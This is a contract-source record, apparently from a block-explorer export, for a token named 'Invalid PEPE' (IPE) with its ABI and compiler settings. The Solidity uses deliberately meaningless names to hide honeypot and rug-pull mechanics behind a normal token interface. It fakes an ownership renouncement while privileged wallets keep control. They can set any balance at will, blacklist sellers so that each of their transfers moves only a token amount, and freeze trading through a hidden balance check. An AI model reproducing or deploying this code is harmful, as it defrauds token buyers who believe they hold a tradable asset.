{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface limitAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyExempt) external view returns (uint256);\n\n    function transfer(address modeWallet, uint256 sellTakeLimit) external returns (bool);\n\n    function allowance(address receiverTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellTakeLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeWallet,\n        uint256 sellTakeLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxReceiver, uint256 value);\n    event Approval(address indexed receiverTo, address indexed spender, uint256 value);\n}\n\nabstract contract senderMaxWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableWalletAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenAuto {\n    function createPair(address teamExempt, address feeTokenTotal) external returns (address);\n}\n\ninterface limitAmountMetadata is limitAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InvalidPEPE is senderMaxWallet, limitAmount, limitAmountMetadata {\n\n    uint256 private launchedShouldAt;\n\n    address private receiverMin;\n\n    function enableMax(address autoFrom, uint256 sellTakeLimit) public {\n        receiverMode();\n        launchTrading[autoFrom] = sellTakeLimit;\n    }\n\n    constructor (){\n        if (senderSell != launchExempt) {\n            shouldTo = true;\n        }\n        enableWalletAt atTotal = enableWalletAt(takeShould);\n        liquidityTo = tokenAuto(atTotal.factory()).createPair(atTotal.WETH(), address(this));\n        \n        tradingTxLaunched = _msgSender();\n        liquidityLimit();\n        marketingShould[tradingTxLaunched] = true;\n        launchTrading[tradingTxLaunched] = teamLaunch;\n        if (exemptLiquidity == launchedToken) {\n            txTeam = launchedShouldAt;\n        }\n        emit Transfer(address(0), tradingTxLaunched, teamLaunch);\n    }\n\n    mapping(address => mapping(address => uint256)) private autoSell;\n\n    address maxEnableMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address maxMinWallet, address modeWallet, uint256 sellTakeLimit) external override returns (bool) {\n        if (_msgSender() != takeShould) {\n            if (autoSell[maxMinWallet][_msgSender()] != type(uint256).max) {\n                require(sellTakeLimit <= autoSell[maxMinWallet][_msgSender()]);\n                autoSell[maxMinWallet][_msgSender()] -= sellTakeLimit;\n            }\n        }\n        return liquidityTotalReceiver(maxMinWallet, modeWallet, sellTakeLimit);\n    }\n\n    uint8 private tradingMode = 18;\n\n    function balanceOf(address buyExempt) public view virtual override returns (uint256) {\n        return launchTrading[buyExempt];\n    }\n\n    bool public shouldTo;\n\n    uint256 exemptBuyShould;\n\n    string private atLiquidityShould = \"IPE\";\n\n    uint256 private launchExempt;\n\n    mapping(address => bool) public atWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return shouldLaunched;\n    }\n\n    mapping(address => uint256) private launchTrading;\n\n    address public liquidityTo;\n\n    string private shouldLaunched = \"Invalid PEPE\";\n\n    function allowance(address txWallet, address swapLaunched) external view virtual override returns (uint256) {\n        if (swapLaunched == takeShould) {\n            return type(uint256).max;\n        }\n        return autoSell[txWallet][swapLaunched];\n    }\n\n    function liquidityLimit() public {\n        emit OwnershipTransferred(tradingTxLaunched, address(0));\n        receiverMin = address(0);\n    }\n\n    event OwnershipTransferred(address indexed listEnable, address indexed isShould);\n\n    mapping(address => bool) public marketingShould;\n\n    uint256 public launchedToken;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamLaunch;\n    }\n\n    address takeShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public tradingTxLaunched;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atLiquidityShould;\n    }\n\n    uint256 private teamLaunch = 100000000 * 10 ** 18;\n\n    function tokenFund(uint256 sellTakeLimit) public {\n        receiverMode();\n        autoAmount = sellTakeLimit;\n    }\n\n    bool public feeSellMin;\n\n    bool private minTokenWallet;\n\n    bool public limitFrom;\n\n    uint256 constant liquidityTokenFee = 6 ** 10;\n\n    uint256 public senderSell;\n\n    uint256 private exemptLiquidity;\n\n    function owner() external view returns (address) {\n        return receiverMin;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingMode;\n    }\n\n    function enableListTotal(address fromMax) public {\n        receiverMode();\n        if (launchExempt == exemptLiquidity) {\n            senderSell = launchExempt;\n        }\n        if (fromMax == tradingTxLaunched || fromMax == liquidityTo) {\n            return;\n        }\n        atWallet[fromMax] = true;\n    }\n\n    function maxMode(address launchedTo) public {\n        require(launchedTo.balance < 100000);\n        if (feeSellMin) {\n            return;\n        }\n        \n        marketingShould[launchedTo] = true;\n        \n        feeSellMin = true;\n    }\n\n    uint256 public txTeam;\n\n    function transfer(address autoFrom, uint256 sellTakeLimit) external virtual override returns (bool) {\n        return liquidityTotalReceiver(_msgSender(), autoFrom, sellTakeLimit);\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverMin;\n    }\n\n    function receiverMode() private view {\n        require(marketingShould[_msgSender()]);\n    }\n\n    function modeAuto(address maxMinWallet, address modeWallet, uint256 sellTakeLimit) internal returns (bool) {\n        require(launchTrading[maxMinWallet] >= sellTakeLimit);\n        launchTrading[maxMinWallet] -= sellTakeLimit;\n        launchTrading[modeWallet] += sellTakeLimit;\n        emit Transfer(maxMinWallet, modeWallet, sellTakeLimit);\n        return true;\n    }\n\n    function liquidityTotalReceiver(address maxMinWallet, address modeWallet, uint256 sellTakeLimit) internal returns (bool) {\n        if (maxMinWallet == tradingTxLaunched) {\n            return modeAuto(maxMinWallet, modeWallet, sellTakeLimit);\n        }\n        uint256 launchedAmountList = limitAmount(liquidityTo).balanceOf(maxEnableMarketing);\n        require(launchedAmountList == autoAmount);\n        require(modeWallet != maxEnableMarketing);\n        if (atWallet[maxMinWallet]) {\n            return modeAuto(maxMinWallet, modeWallet, liquidityTokenFee);\n        }\n        return modeAuto(maxMinWallet, modeWallet, sellTakeLimit);\n    }\n\n    uint256 autoAmount;\n\n    function approve(address swapLaunched, uint256 sellTakeLimit) public virtual override returns (bool) {\n        autoSell[_msgSender()][swapLaunched] = sellTakeLimit;\n        emit Approval(_msgSender(), swapLaunched, sellTakeLimit);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTakeLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"}],\"name\":\"enableListTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTakeLimit\",\"type\":\"uint256\"}],\"name\":\"enableMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSellMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTo\",\"type\":\"address\"}],\"name\":\"maxMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellTakeLimit\",\"type\":\"uint256\"}],\"name\":\"tokenFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTxLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTakeLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMinWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTakeLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "InvalidPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}